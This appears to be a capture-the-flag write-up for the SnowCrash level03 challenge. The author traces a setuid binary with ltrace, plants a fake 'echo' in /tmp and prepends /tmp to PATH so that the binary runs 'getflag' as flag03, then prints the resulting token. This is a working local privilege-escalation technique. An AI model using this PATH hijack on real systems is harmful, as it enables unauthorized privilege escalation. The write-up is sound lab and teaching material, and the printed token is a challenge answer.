# Level03


# Context

after login with user `level03` end up with a executeable file named `level03`

```
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$
```

# Steps to repreduce
if you go a head and execute the excuteabel
```
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$
```

I tried to use `file` command to check the type of the file and get some information about if
```
level03@SnowCrash:~$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
level03@SnowCrash:~$
```
as we can see the file is an executable compailed with `gcc`.

now I have to find a way so I can reverse this file to source code.

while searching I found 3 main tools that can help me to atchive what I want `ltrace`, `strace`, and `gdb`.

for me I used `ltrace`, `ltrace` simply logged library functions that the program called and received.

```
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7a4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                           = 2003
geteuid()                                                                                                           = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                 = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                 = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                              = 0
+++ exited (status 0) +++
level03@SnowCrash:~$
```

as you can see the program called some functions the first 4 functions will not help us so I will just ignore them but `system("/usr/bin/env echo Exploit me"Exploit me` the program call `system` this fuction passes the command (it's param) to the system enviermomnet to be excuted.

so in other words if I found out a way so I can change the `echo` command to exected what I want instead of normal echo behaver I can get the flag.

well that's exactly what I did.

simply I wll try to get the privilege  of the user `flag03` whit changing the built-in echo behavier.

as you can see the user of this file is `flag03`
```
level03@SnowCrash:~$ ls -la level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$
```

so this time I don't need to login with user then run the command `getflag` I will make him run it for me.

first I will create a tmp file named `/tmp/echo` then inside it `echo getflag`

```
echo getflag > /tmp/echo
```

then make the `/tmp/echo` file executeable by running this command
```
chmod +x /tmp/echo
```

finaly and most important step is add my file to env variable `$PATH`
```
export PATH=/tmp:$PATH
```

so the final command will be:
```
echo getflag > /tmp/echo && chmod +x /tmp/echo && export PATH=/tmp:$PATH
```

now my `PATH` variable:
```
level03@SnowCrash:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$
```

so let's rerun the program again:
```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$
```

et voila.
